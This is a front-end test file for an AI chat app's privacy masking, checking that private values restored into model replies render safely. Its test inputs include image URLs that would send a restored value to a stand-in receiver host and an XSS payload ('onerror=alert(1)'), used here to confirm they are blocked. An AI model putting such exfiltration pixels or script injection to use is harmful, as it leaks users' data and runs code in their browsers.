import { webcrypto } from 'node:crypto';

import { flushPromises, mount } from '@vue/test-utils';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import {
    maskDesktopModelMessages as maskAiMessages,
    type PrivacyStreamChunk,
    restorePrivacyChunk,
} from '@/adapters/models/privacy';
import { privacyApiKey } from '@/app/api/privacy';
import { assemblePrivacyWindow } from '@/app/composition/privacy';
import MarkdownPrivacyCode from '@/components/MarkdownPrivacyCode.vue';
import { setLocale } from '@/i18n';
import type { TaskViewSnapshot as SessionTaskSnapshot } from '@/modules/agent/contracts/task';
import { SessionTaskProjection } from '@/modules/agent/projection/create';
import { usePrivacyStore } from '@/stores/privacy';
import AssistantMessage from '@/views/SearchView/components/ConversationPanel/components/AssistantMessage.vue';

import { createSettingsWindowFixture } from '../utils/settingsWindow';

const original = 'ada@example.test';
const wrappers: ReturnType<typeof mount>[] = [];
let fixture: ReturnType<typeof createSettingsWindowFixture>;
let privacy: ReturnType<typeof assemblePrivacyWindow>;
const useSettingsStore = () => fixture.app.runWithContext(() => usePrivacyStore(fixture.pinia));
const clearPrivacyReview = () => privacy.api.clearPrivacyReview();
beforeEach(async () => {
    vi.stubGlobal('crypto', webcrypto);
    setLocale('zh-CN');
    fixture = createSettingsWindowFixture({ values: { language: 'zh-CN' } });
    privacy = assemblePrivacyWindow(fixture.window.privacySettings);
    fixture.app.provide(privacyApiKey, privacy.api);
    await fixture.initialize();
    await privacy.api.updatePrivacyFilterSettings({
        ...privacy.api.getPrivacyFilterSettings(),
        enabled: true,
        useLocalModel: false,
    });
    await useSettingsStore().initialize();
});
afterEach(() => {
    wrappers.splice(0).forEach((wrapper) => wrapper.unmount());
    privacy.dispose();
    fixture.dispose();
    vi.unstubAllGlobals();
    document.body.innerHTML = '';
});

async function conversation(value = original) {
    const masked = await maskAiMessages(
        [{ role: 'user', content: value }],
        useSettingsStore().privacyFilterSettings,
        undefined,
        privacy.api.getReviewSnapshot().generation
    );
    const placeholder = masked.messages[0]!.content as string;
    const snapshot: SessionTaskSnapshot = {
        taskId: 'privacy-reply',
        sessionId: 1,
        turnId: null,
        status: 'running',
        executionMode: 'foreground',
        sessionHistory: [],
        pendingUserMessages: [],
        pendingToolApproval: null,
        pendingApprovals: [],
        pendingUserQuestion: null,
        error: null,
        currentModel: null,
        startedAt: 1,
        updatedAt: 1,
        modelSwitchCount: 0,
    };
    let restoration: PrivacyStreamChunk['privacyRestoration'];
    const projection = new SessionTaskProjection(
        snapshot,
        () => {},
        { tt: (text) => text, errorText: (text) => text, retryText: () => '' },
        {
            resolveSemantic: () => null,
            presentation: () => null,
            widgetToolName: 'builtin__show_widget',
        },
        (append) => {
            if (restoration)
                privacy.api.publishRestoredPrivacyReview(
                    append.partId,
                    append.offset,
                    restoration.spans,
                    restoration.generation
                );
        }
    );
    projection.bootstrap([], value, []);
    const message = () =>
        structuredClone(snapshot.sessionHistory[snapshot.sessionHistory.length - 1]!);
    const wrapper = mount(AssistantMessage, {
        ...fixture.viewOptions,
        global: {
            ...fixture.viewOptions.global,
            provide: {
                ...fixture.viewOptions.global.provide,
                [privacyApiKey as symbol]: privacy.api,
            },
        },
        props: { message: message() },
        attachTo: document.body,
    });
    wrappers.push(wrapper);
    const buffers = new Map<string, string>();
    async function append(content: string, done = false) {
        const chunk = restorePrivacyChunk({ content, done }, masked.session, buffers);
        restoration = chunk.privacyRestoration;
        projection.handleChunk(chunk);
        restoration = undefined;
        if (done) projection.markCompleted();
        await wrapper.setProps({ message: message() });
        await flushPromises();
    }
    return { wrapper, append, placeholder };
}

describe('given an assistant restores a protected value in its reply', () => {
    it('user reads highlighted private code with Windows line endings then every original character and its review marker remain intact', async () => {
        const code = `{\r\n  "email":"${original}"\r\n}`;
        const start = code.indexOf(original);
        const wrapper = mount(MarkdownPrivacyCode, {
            props: {
                showHeader: true,
                node: {
                    type: 'code_block',
                    code,
                    raw: code,
                    language: 'json',
                    privacyAnnotations: [
                        {
                            messageId: 'reply:windows-code',
                            textHash: '',
                            start,
                            end: start + original.length,
                            original,
                            placeholder: '{{EMAIL_0000000000000001}}',
                            kind: 'email',
                        },
                    ],
                },
            },
        });
        wrappers.push(wrapper);
        await vi.waitFor(() => expect(wrapper.find('code span[style]').exists()).toBe(true));
        expect(wrapper.get('code').element.textContent).toBe(code);
        expect(wrapper.get('[data-testid="privacy-protected-text"]').text()).toBe(original);
    });
    it.each(['markdown', 'html', 'nested html'])(
        'user receives a restored value in a remote image URL through %s then no image loads automatically even after review is cleared',
        async (format) => {
            const { wrapper, append, placeholder } = await conversation();
            const url = `https://receiver.example.test/pixel?value=${placeholder}`;
            await append(
                format === 'markdown'
                    ? `![image](${url})`
                    : format === 'html'
                      ? `<img src="${url}">`
                      : `<div><img src="${url}"></div>`,
                true
            );
            expect(wrapper.find('img').exists()).toBe(false);
            clearPrivacyReview();
            await flushPromises();
            expect(wrapper.find('img').exists()).toBe(false);
        }
    );

    it('user receives a restored value inside fenced code then its marker opens the reverse review and copying keeps the original', async () => {
        const { wrapper, append, placeholder } = await conversation();
        await append(`\`\`\`json\n{"email":"${placeholder}"}\n\`\`\``, true);
        const marker = wrapper.get('code [data-testid="privacy-protected-text"]');
        expect(marker.text()).toBe(original);
        await marker.trigger('click');
        await vi.waitFor(() =>
            expect(
                document.querySelector('[data-testid="privacy-protection-tooltip"]')?.textContent
            ).toContain(placeholder)
        );
    });
    it('user receives a placeholder split across chunks then the restored reply has an underline and the model returned value on activation', async () => {
        const { wrapper, append, placeholder } = await conversation();
        await append(`已收到，我会联系 ${placeholder.slice(0, 10)}`);
        expect(wrapper.find('[data-testid="privacy-protected-text"]').exists()).toBe(false);
        await append(`${placeholder.slice(10)} 处理订单。`, true);
        const marker = wrapper.get('[data-testid="privacy-protected-text"]');
        expect(marker.text()).toBe(original);
        expect(marker.classes()).toContain('decoration-subtle');
        expect(wrapper.get('.touchai-markdown').text()).toBe(
            `已收到，我会联系 ${original} 处理订单。`
        );
        await marker.trigger('click');
        await vi.waitFor(() => {
            const card = document.querySelector('[data-testid="privacy-protection-tooltip"]');
            expect(card?.textContent).toContain('已本地还原');
            expect(card?.textContent).toContain('模型返回');
            expect(card?.textContent).not.toContain('实际发送');
            expect(card?.textContent).toContain(placeholder);
        });
    });

    it('user reads an unprotected reply with the same spelling then it does not claim local protection', async () => {
        const { wrapper, append } = await conversation();
        await append(`联系 ${original}`, true);
        expect(wrapper.get('.touchai-markdown').text()).toBe(`联系 ${original}`);
        expect(wrapper.find('[data-testid="privacy-protected-text"]').exists()).toBe(false);
    });

    it('user reads repeated spelling then only the occurrence restored from a placeholder is marked', async () => {
        const { wrapper, append, placeholder } = await conversation();
        await append(`原文 ${original}，还原 ${placeholder}`, true);
        expect(wrapper.findAll('[data-testid="privacy-protected-text"]')).toHaveLength(1);
        expect(wrapper.get('.touchai-markdown').element.textContent).toBe(
            `原文 ${original}，还原 ${original}`
        );
    });

    it('user receives protected markup characters then their local original stays literal and cannot create elements', async () => {
        const value = '<img src=x onerror=alert(1)> **private**';
        useSettingsStore().privacyFilterSettings.maskedWords = [value];
        const { wrapper, append, placeholder } = await conversation(value);
        await append(`还原 ${placeholder}`, true);
        expect(wrapper.get('[data-testid="privacy-protected-text"]').text()).toBe(value);
        expect(wrapper.find('img').exists()).toBe(false);
        expect(wrapper.find('strong').exists()).toBe(false);
    });

    it('user reads protected values in formatted reply text then emphasis links and inline code stay intact', async () => {
        const { wrapper, append, placeholder } = await conversation();
        await append(`**${placeholder}** [官网](https://example.test) \`${placeholder}\``, true);
        await vi.waitFor(() =>
            expect(wrapper.findAll('[data-testid="privacy-protected-text"]')).toHaveLength(2)
        );
        expect(wrapper.get('strong [data-testid="privacy-protected-text"]').text()).toBe(original);
        expect(wrapper.get('code [data-testid="privacy-protected-text"]').text()).toBe(original);
        expect(wrapper.get('a').attributes('href')).toBe('https://example.test');
        expect(wrapper.get('a').text()).toBe('官网');
    });

    it('user reads a protected address in a link then the link destination restores along with its underlined label', async () => {
        const { wrapper, append, placeholder } = await conversation();
        await append(`[${placeholder}](mailto:${placeholder})`, true);
        expect(wrapper.get('a').attributes('href')).toBe(`mailto:${original}`);
        expect(wrapper.get('a [data-testid="privacy-protected-text"]').text()).toBe(original);
    });

    it('user clears privacy review during a reply then existing and late restored values lose their annotation without changing the text', async () => {
        const { wrapper, append, placeholder } = await conversation();
        await append(placeholder);
        await vi.waitFor(() =>
            expect(wrapper.find('[data-testid="privacy-protected-text"]').exists()).toBe(true)
        );
        await wrapper.get('[data-testid="privacy-protected-text"]').trigger('click');
        clearPrivacyReview();
        await append(`，${placeholder}`, true);
        expect(wrapper.find('[data-testid="privacy-protected-text"]').exists()).toBe(false);
        expect(document.querySelector('[data-testid="privacy-protection-tooltip"]')).toBeNull();
        expect(wrapper.get('.touchai-markdown').text()).toBe(`${original}，${original}`);
    });

    it('user disables privacy filtering then the reply marker disappears while the reply stays readable', async () => {
        const { wrapper, append, placeholder } = await conversation();
        await append(placeholder, true);
        await vi.waitFor(() =>
            expect(wrapper.find('[data-testid="privacy-protected-text"]').exists()).toBe(true)
        );
        useSettingsStore().privacyFilterSettings.enabled = false;
        await flushPromises();
        expect(wrapper.find('[data-testid="privacy-protected-text"]').exists()).toBe(false);
        expect(wrapper.get('.touchai-markdown').text()).toBe(original);
    });
});
